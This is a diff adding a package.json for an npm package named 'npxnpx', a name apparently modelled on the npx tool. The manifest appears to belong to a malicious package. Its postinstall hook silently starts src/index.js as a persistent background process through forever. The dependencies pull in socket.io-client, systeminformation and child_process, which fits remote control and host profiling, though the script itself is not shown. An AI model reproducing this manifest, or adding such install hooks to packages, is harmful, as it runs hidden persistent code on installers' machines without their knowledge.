@@ -1,0 +1,14 @@
+{
+    "name": "npxnpx",
+    "version": "1.0.1",
+    "scripts": {
+        "postinstall": "forever start src/index.js"
+    },
+    "dependencies": {
+        "child_process": "^1.0.2",
+        "forever": "^3.0.4",
+        "socket.io-client": "^3.1.1",
+        "systeminformation": "^5.6.8"
+    },
+    "devDependencies": {}
+}
